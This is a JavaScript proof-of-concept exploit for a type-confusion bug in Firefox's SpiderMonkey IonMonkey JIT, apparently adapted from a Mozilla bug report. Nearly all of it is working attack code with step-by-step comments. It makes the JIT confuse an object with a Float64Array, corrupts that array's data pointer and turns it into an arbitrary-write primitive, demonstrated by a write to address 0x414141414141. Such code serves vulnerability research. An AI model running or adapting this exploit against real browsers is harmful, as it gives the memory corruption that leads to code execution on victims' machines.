//original PoC taken from https://bugzilla.mozilla.org/show_bug.cgi?id=1530958

let ab = new ArrayBuffer(0x1000);
let victim = new Uint8Array(0x1000);

function Hax(val, l, trigger) {
    // In the final invocation:

    // Ultimately confuse these two objects which each other.
    // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)
    let x = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: []};
    // y is a real ArrayBufferView object.
    let y = new Float64Array(0x1000);

    // * Trigger a conversion of |this| to a NativeObject.
    // * Update Hax's template type to NativeObject with .a and .x (and potentially .y)
    // * Trigger the "roll back" of |this| to a NativeObject with only property .a
    // * Bailout of the JITed code due to type inference changes
    this.a = val;

    // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
    // incorrectly assume that |this| already has the final type (so already has property .x)
    for (let i = 0; i < l; i++) {}

    // The JITed code will now only have a property store here and won't update the Shape.
    this.x = x;

    if (trigger) {
        // This property definition is conditional (and rarely used) so that an inline cache
        // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
        // be put into the same slot as .x, as the Shape of |this| only shows property .a.
        this.y = y;

        // At this point, .x and .y overlap, and the JITed code below believes that the slot
        // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
    }

    // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
    this.x.data = victim;
}

for (let i = 0; i < 1000; i++) {
    new Hax(1337, 1, false);
}
let obj = new Hax("asdf", 10000000, true);

// Driver is now a Float64Array whose data pointer points to a Uint8Array.
let driver = obj.y;

// Write to address 0x414141414141 as PoC
driver[7] = 3.54484805889626e-310;
victim[0] = 42;

